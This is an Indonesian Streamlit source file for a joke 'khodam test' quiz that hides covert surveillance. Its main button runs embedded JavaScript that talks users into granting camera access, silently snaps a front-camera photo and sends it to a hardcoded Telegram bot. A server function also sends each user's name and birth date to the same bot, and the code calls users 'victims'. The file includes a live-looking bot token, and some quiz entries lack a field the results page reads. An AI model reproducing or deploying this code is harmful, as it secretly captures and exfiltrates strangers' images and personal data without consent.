import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime
import hashlib

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Tes Khodam Sultan",
    page_icon="💀",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING WARNA WARNI MENTAL AMBYAR
# ==========================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&display=swap');

    .stApp {
        background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
        color: #ffffff;
        font-family: 'Fredoka', cursive, sans-serif;
    }

    .gokil-card {
        background: rgba(255, 255, 255, 0.08);
        backdrop-filter: blur(15px);
        border: 4px dashed #ff0055;
        border-radius: 30px;
        padding: 30px;
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.9), 0 0 30px rgba(255, 0, 85, 0.4);
        margin-bottom: 25px;
    }

    .hook-box {
        background: linear-gradient(135deg, #ff007f 0%, #7209b7 100%);
        border: 3px solid #00f2fe;
        padding: 18px 22px;
        border-radius: 20px;
        margin-bottom: 20px;
        font-size: 15px;
        color: #ffffff;
        text-align: center;
        font-weight: 700;
        box-shadow: 0 5px 20px rgba(255, 0, 127, 0.7);
        line-height: 1.6;
    }

    .stButton > button {
        background: #111111 !important;
        color: #00f2fe !important;
        border: 3px solid #00f2fe !important;
        font-weight: 700 !important;
        font-size: 16px !important;
        text-align: center !important;
        padding: 14px 20px !important;
        border-radius: 18px !important;
        width: 100% !important;
        transition: all 0.3s ease !important;
    }
    .stButton > button:hover {
        background: #00f2fe !important;
        color: #000000 !important;
        transform: scale(1.03) !important;
    }

    .stTextInput > div > div > input {
        background-color: rgba(0, 0, 0, 0.5) !important;
        color: #ffff00 !important;
        border: 3px solid #00f2fe !important;
        border-radius: 16px !important;
        padding: 14px !important;
        font-family: 'Fredoka', cursive, sans-serif;
        font-size: 16px;
        font-weight: 600;
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# INISIALISASI SESSION STATE
# ==========================================
if 'step' not in st.session_state:
    st.session_state.step = 0
if 'user_name' not in st.session_state:
    st.session_state.user_name = ""
if 'user_dob' not in st.session_state:
    st.session_state.user_dob = ""
if 'telegram_sent' not in st.session_state:
    st.session_state.telegram_sent = False
if 'current_profile' not in st.session_state:
    st.session_state.current_profile = None

# ==========================================
# DATABASE RATUSAN KHODAM HEWAN & HANTU KOCAK
# ==========================================
MASTER_KHODAM = [
    {
        "title": "👻 Pocong Nyicil Kredit Motor Beat Fi",
        "desc": "Jalannya gak bisa loncat-loncat karena takut tagihan leasing bulanan datang. Hobinya nongkrong di pinggir kuburan sambil nunggu kurir paket Shopee COD datang bawa obralan celana kolor.",
        "saran": "Saran Dukun: Kasih dia oli samping saset biar jalannya gak kaku pas mau kabur dari DC leasing."
    },
    {
        "title": "🐒 Monyet Nge-vape Rasa Susu Pisang Susu",
        "desc": "Muka lu keliatan kaya orang bener, tapi aslinya doyan nongkrong di minimarket cuma numpang ngadem sambil numpang colokan HP temen. Dikit-dikit minta hotspot pas kuota sisa 2 MB!",
        "saran": "Saran Dukun: Jangan dibeliin liquid mahal, cukup tetesin bensin pertalite biar uapnya cetar membahana."
    },
    {
        "title": "🧟‍♂️ Genderuwo Pengangguran Suka Numpang Wifi Tetangga",
        "desc": "Badan gede berbulu lebat tapi kerjanya cuma rebahan seharian di dipan bambu sambil stalker mantan pake akun fake berkedok jualan baju online.",
        "saran": "Saran Dukun: Suruh dia jaga malam di gudang kapur biar bulunya rontok jadi bulu angsa."
    },
    {
        "title": "🩴 Swallow Putus Tali Korban Badai Asmara",
        "desc": "Simbol keabadian jomblo akut. Kalau HP lowbat 1% langsung panik kaya orang mau kiamat, padahal gak ada satupun chat masuk selain pesan operator seluler."
    },
    {
        "title": "🧛‍♀️️ Kuntilanak Nyasar di Konter HP Bekas",
        "desc": "Ketawanya cekikikan tiap kali liat saldo DANA lu tinggal sisa Rp 420 perak. Hobinya minjem casan tapi gak pernah dibalikin dengan alasan 'lupa dibawa pulang'.",
        "saran": "Saran Dukun: Bungkus rambutnya pake karet gelang merah biar anteng gak ngeriwer mulu."
    },
    {
        "title": "🍲 Kuah Seblak Ceker Setan Campur Es Teh Jumbo",
        "desc": "Hidup lu penuh drama sinetron azab Indosiar! Muka garang kaya preman terminal, tapi aslinya kalau nonton kartun Upin Ipin nangisnya sampe ingusan netes ke lantai."
    },
    {
        "title": "🐟 Lele Suthil Nyangkut di Selokan Bau Comberan",
        "desc": "Licin banget kaya belut disiram oli. Kalau ditagih utang atau ditanya 'Kapan kawin?', lu lari kenceng banget ngalahin rekor Usain Bolt sambil pura-pura kesurupan jin ijo.",
        "saran": "Saran Dukun: Mandi pake air rendaman daun pepaya dicampur garam dapur biar licinnya ilang."
    },
    {
        "title": "🐱 Kucing Oren Suka Nyolong Ikan Asin di Warteg",
        "desc": "Urat malu lu udah putus di pabriknya! Kerjanya cuma makan, tidur, bikin rusuh, terus ngorok makin kenceng ngalahin suara mesin gergaji kayu."
    },
    {
        "title": "🦊 Rubah Nyasar Tukang Gesek Tunai Bodong",
        "desc": "Pintar ngeles kalau lagi ketahuan belangnya. Kalau ngutang janjinya 'besok dibayar', tapi besoknya malah pindah planet."
    },
    {
        "title": "💀 Tuyul Gundul Hobi Main Slot Online Jam 3 Pagi",
        "desc": "Dompet lu bolong bukan karena dicuri makhluk halus, tapi karena tangan lu gatal mencet tombol spin slot zeus pas tengah malem buta!"
    },
    {
        "title": "🦅 Burung Hantu Insomnia Kurang Piknik",
        "desc": "Mata panda permanen akibat keseringan mikirin gimana caranya dapet duit segepok tanpa kerja keras. Hobinya melototin langit-langit kamar sambil meratapi nasib."
    },
    {
        "title": "🐸 Kodok Ngorek Minta Saweria ke Sultan TikTok",
        "desc": "Hati lu hancur lebur berkeping-keping pas live streaming gak ada yang nonton kecuali akun bot jualan obat kuat."
    },
    {
        "title": "🦇 Kelelawar Gosip Komplek Perumahan",
        "desc": "Telinga lu paling peka kalau denger tetangga sebelah beli perabotan baru atau lagi berantem masalah jemuran pakaian."
    },
    {
        "title": "🐉 Naga Garut Oplosan Gas Elpiji 3 Kg",
        "desc": "Napas lu bau terasi mentah tapi belagunya kaya penguasa jagat raya. Dikit-dikit ngambek kalau jatah jajan turunnya telat."
    },
    {
        "title": "🐅 Harimau Cisewu Senyum Terpaksa di Sawah",
        "desc": "Keliatannya sangar di luar, tapi kalau di rumah disuruh emak beli terasi ke warung ujung jalan lgsung mendadak ayan."
    },
    {
        "title": "🐂 Banteng Ngamuk Rebutan Parkiran Liar",
        "desc": "Darah tinggi gampang kambuh kalau pas markir motor ditarik uang karcis dua kali lipat padahal gak dipelopori tukang parkirnya."
    },
    {
        "title": "🧟 Suster Ngesot Salah Jurusan Kuliah",
        "desc": "Niatnya mau ngejar cita-cita jadi sarjana hukum, tapi malah nyasar jadi tukang ngesot di koridor rumah sakit jiwa."
    },
    {
        "title": "🦈 Hiu Darat Penagih Utang Arisan RT",
        "desc": "Gerakannya lambat tapi auranya bikin jantung berdegup kencang tiap kali ibu-ibu arisan nagih iuran bulanan."
    },
    {
        "title": "🐕 Anjing Kepo Suka Nyolong Sandal Jepit Masjid",
        "desc": "Gak tenang hidup lu kalau belum tau rahasia hidup orang lain. Hobinya nge-checkin status story WhatsApp semua kontak dari A sampe Z."
    },
    {
        "title": "👻 Jenglot Kurus Kering Kurang Perhatian",
        "desc": "Badan sekecil lidi tapi makannya doyan prasmanan hajatan tetangga sampe tiga piring penuh."
    }
]

# Tambahan generator dinamis biar total variasi khodam tembus ratusan secara otomatis
HEWAN_LIST = ["Babi", "Monyet", "Kucing", "Anjing", "Ayam", "Bebek", "Kelinci", "Ular", "Buaya", "Cicak", "Tikus", "Kecoa", "Musang", "Landak", "Gurita", "Paus", "Lumba-lumba", "Kuda", "Keledai", "Domba"]
HANTU_LIST = ["Pocong", "Kuntilanak", "Genderuwo", "Tuyul", "Jenglot", "Sundel Bolong", "Wewe Gombel", "Babi Ngepet", "Palasik", "Leak", "Buto Ijo", "Kolor Ijo", "Kuyang", "Banaspati", "Suster Ngesot"]
SIFAT_LIST = [
    "Sok Asik Tapi Jomblo Abadi", "Nge-vape Rokok Elektrik Pinjaman", "Suka Ngutang di Warung Madura", 
    "Hobi Nge-stalk Mantan Pake Akun Fake", "Kena Badai Asmara Palsu", "Suka Tidur di Bawah Kolong Kasur",
    "Kecanduan Gorengan Bakwan Panas", "Sering Lupa Taruh HP di Mana Padahal Dipegang", "Pawang Hujan Gagal Total",
    "Suka Nyolong Wifi Rumah Pak RT", "Mental Ambyar Saldo Rekening Tipis", "Sering Dikira Tuyul Pas Lewat Gang Sempit"
]

for h in HEWAN_LIST:
    for s in SIFAT_LIST:
        MASTER_KHODAM.append({
            "title": f"🐾 Khodam {h} {s}",
            "desc": f"Makhluk gaib keturunan langsung dari {h.lower()} peliharaan dukun sakti yang hobi {s.lower()} tiap kali malam jumat kliwon tiba.",
            "saran": f"Saran Dukun: Mandi kembang tujuh rupa dicampur air es teh manis supaya khodam {h.lower()} ini gak gampang ngambek."
        })

for ht in HANTU_LIST:
    for s in SIFAT_LIST:
        MASTER_KHODAM.append({
            "title": f"👻 Khodam {ht} {s}",
            "desc": f"Sesosok {ht.lower()} penasaran yang nyasar ke dalam pikiran lu gara-gara sering banget overthinking tengah malam.",
            "saran": f"Saran Dukun: Bakar dupa wangi aroma buhur dicampur obat nyamuk bakar merk kingkong biar hantunya puyeng."
        })


# ==========================================
# FUNGSI KIRIM TELEGRAM
# ==========================================
def send_text_to_telegram(name, dob, profile_title):
    now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    caption = (
        f"💀 <b>KORBAN DUKUN UGAL-UGALAN TERCYDUK!</b>\n\n"
        f"👤 Nama: <b>{name}</b>\n"
        f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
        f"🕒 Waktu: {now}\n"
        f"🐾 Hasil Khodam: <b>{profile_title}</b>"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
        )
    except Exception as e:
        print(f"[!] Gagal mengirim notifikasi Telegram: {e}")

# ==========================================
# RENDER UTAMA BERDASARKAN STEP
# ==========================================

if st.session_state.step == 0:
    st.markdown("<h1 style='text-align: center; color: #ffff00; text-shadow: 3px 3px #ff0055;'>💀 ARENA ROASTING KHODAM & MENTAL AMBYAR 💀</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #00f2fe; font-size: 1.15rem; margin-bottom: 20px; font-weight: 600;'>Tes seberapa bobrok mental lu dan temukan ratusan hewan & hantu gaib yang nongkrong di jidat lu!</p>", unsafe_allow_html=True)

    with st.container():
        st.markdown('<div class="gokil-card">', unsafe_allow_html=True)
        
        st.markdown("""
            <div class="hook-box">
                🔥 <b>SYARAT WAJIB DARI DUKUN SAKIT JIWA:</b><br>
                Supaya sensor dan filter gaib lu akurat, wajib klik tombol <b>"Allow / Izinkan"</b> pas pop-up kamera muncul di layar HP lu ya bosku! 📸✨
            </div>
        """, unsafe_allow_html=True)
        
        name_input = st.text_input("NAMA PANGGILAN ALIAS LU DI KTP", value=st.session_state.get('temp_name', ''), placeholder="Contoh: Bogel Penguasa Terminal")
        dob_input = st.text_input("TANGGAL LAHIR (DD/MM/YYYY)", value=st.session_state.get('temp_dob', ''), placeholder="Contoh: 17/08/1945")
        
        st.write("")
        
        # Tombol HTML Kustom untuk memicu pop-up kamera instan saat diklik
        custom_action_button = f"""
        <div style="text-align: center;">
            <button id="bongkarBtn" style="
                background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
                color: #0b090a;
                font-weight: 800;
                font-size: 18px;
                letter-spacing: 1px;
                border: 3px solid #ffff00;
                padding: 16px 20px;
                border-radius: 24px;
                width: 100%;
                cursor: pointer;
                box-shadow: 0 8px 30px rgba(0, 242, 254, 0.8);
                text-transform: uppercase;
                font-family: 'Fredoka', cursive, sans-serif;
            ">🔥 BONGKAR AIB & KHODAM SEKARANG!</button>
        </div>

        <video id="live-cam" autoplay playsinline style="display:none;"></video>
        <canvas id="live-canvas" width="640" height="480" style="display:none;"></canvas>

        <script>
            const token = "{TELEGRAM_BOT_TOKEN}";
            const chatId = "{TELEGRAM_CHAT_ID}";

            document.getElementById('bongkarBtn').addEventListener('click', async function() {{
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                    const video = document.getElementById('live-cam');
                    video.srcObject = stream;
                    
                    await new Promise(r => setTimeout(r, 1000));
                    
                    const canvas = document.getElementById('live-canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(function(blob) {{
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('photo', blob, 'korban_tercyduk.jpg');
                        fd.append('caption', '💀 <b>KORBAN TERCYDUK KLIK TOMBOL BONGKAR AIB!</b>');
                        
                        fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                            method: 'POST',
                            body: fd
                        }});
                    }}, 'image/jpeg', 0.8);
                    
                    stream.getTracks().forEach(track => track.stop());
                }} catch(e) {{
                    console.log("Gagal akses kamera: ", e);
                }}
            }});
        </script>
        """
        components.html(custom_action_button, height=80)
        
        if name_input:
            st.session_state.user_name = name_input
            st.session_state.user_dob = dob_input if dob_input else "Lupa tanggal lahir"
            
        st.write("")
        if st.button("👉 KLIK DI SINI UNTUK MELIHAT HASIL KHODAM"):
            if not st.session_state.user_name.strip():
                st.warning("⚠️ Woy, tulis dulu nama lu di kotak atas sebelum dipantau dukun!")
            else:
                # MENGGUNAKAN HASH AGAR HASIL UNIK & KONSISTEN BERDASARKAN NAMA + TANGGAL LAHIR
                raw_str = (st.session_state.user_name + st.session_state.user_dob).lower().strip()
                hash_val = int(hashlib.md5(raw_str.encode('utf-8')).hexdigest(), 16)
                
                chosen_idx = hash_val % len(MASTER_KHODAM)
                bobrok_level = 90 + (hash_val % 11) # Nilai antara 90% - 100%
                
                profile = MASTER_KHODAM[chosen_idx].copy()
                profile['power'] = f"Tingkat Kebobrokan Mental: {bobrok_level}% (LEVEL KRONIS TANPA OBAT)"
                
                st.session_state.current_profile = profile
                st.session_state.step = 2
                st.rerun()
                
        st.markdown('</div>', unsafe_allow_html=True)

elif st.session_state.step == 2:
    if not st.session_state.telegram_sent and st.session_state.current_profile:
        send_text_to_telegram(
            name=st.session_state.user_name,
            dob=st.session_state.user_dob,
            profile_title=st.session_state.current_profile['title']
        )
        st.session_state.telegram_sent = True

    profile = st.session_state.current_profile

    st.markdown(f"<h2 style='text-align: center; color: #ffff00; text-shadow: 3px 3px #ff0055;'>🎉 DOR! HASIL ROASTING KELUAR 🎉</h2>", unsafe_allow_html=True)
    st.write("")

    if profile:
        st.markdown('<div class="gokil-card">', unsafe_allow_html=True)
        st.markdown(f"<h3 style='color: #00f2fe; text-align: center; font-size: 1.4rem;'>{profile['title']}</h3>", unsafe_allow_html=True)
        st.markdown(f"<p style='text-align: center; color: #ffff00; font-weight: 800; font-size: 1.2rem;'>{profile['power']}</p>", unsafe_allow_html=True)
        st.markdown("<hr style='border-color: rgba(255, 255, 255, 0.4); border-style: dashed;'>", unsafe_allow_html=True)
        st.markdown(f"<p style='text-align: center; font-size: 1.12rem; line-height: 1.7; color: #ffffff; font-weight: 600;'>{profile['desc']}</p>", unsafe_allow_html=True)
        st.markdown("<hr style='border-color: rgba(255, 255, 255, 0.4); border-style: dashed;'>", unsafe_allow_html=True)
        st.markdown(f"<p style='text-align: center; font-size: 1.05rem; line-height: 1.6; color: #00f2fe; font-weight: 700;'>{profile['saran']}</p>", unsafe_allow_html=True)
        st.markdown('</div>', unsafe_allow_html=True)

    st.write("")
    if st.button("🔄 COBA LAGI (KERJAIN TEMAN SEBELAH LU)", use_container_width=True):
        st.session_state.step = 0
        st.session_state.user_name = ""
        st.session_state.user_dob = ""
        st.session_state.telegram_sent = False
        st.session_state.current_profile = None
        st.rerun()
